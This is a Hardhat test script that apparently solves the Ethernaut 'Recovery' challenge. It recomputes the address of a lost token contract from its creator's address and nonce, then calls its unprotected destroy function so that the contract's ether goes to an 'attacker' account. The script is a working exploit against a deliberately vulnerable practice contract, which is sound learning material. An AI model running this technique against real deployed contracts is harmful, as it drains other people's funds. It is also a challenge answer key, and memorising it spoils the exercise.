import { expect } from "chai";
import { ethers } from "hardhat";
const { parseEther, keccak256, RLP, hexlify } = ethers.utils

describe("Recovery", async function () {

  it("Should empty the SimpleToken created by Recovery", async function () {
    //setup+
    const [deployer, attacker] = await ethers.getSigners()
    const Recovery = await ethers.getContractFactory("Recovery");
    const recovery = await Recovery.deploy();
    await recovery.deployed();

    const rplresult = RLP.encode([recovery.address, "0x01"])
    const address = "0x" + keccak256(rplresult).slice(26)

    await deployer.sendTransaction({ to: address, value: parseEther("0.001") })

    await recovery.generateToken("InitialToken", 100000)
    //setup-

    //1.Get contract's transaction's count
    const txCount = await ethers.provider.getTransactionCount(recovery.address)
    //2.Calculate address
    const SimpleTokenRPLResult = RLP.encode([recovery.address, hexlify(txCount - 1)])
    const simpleTokenAddress = "0x" + keccak256(SimpleTokenRPLResult).slice(26)

    const simpleToken = await ethers.getContractAt("SimpleToken", simpleTokenAddress)

    expect(await ethers.provider.getBalance(simpleTokenAddress)).to.gt(0)
    //3.Call destruct
    await simpleToken.destroy(attacker.address)

    expect(await ethers.provider.getBalance(simpleTokenAddress)).to.eq(0)
  });

});
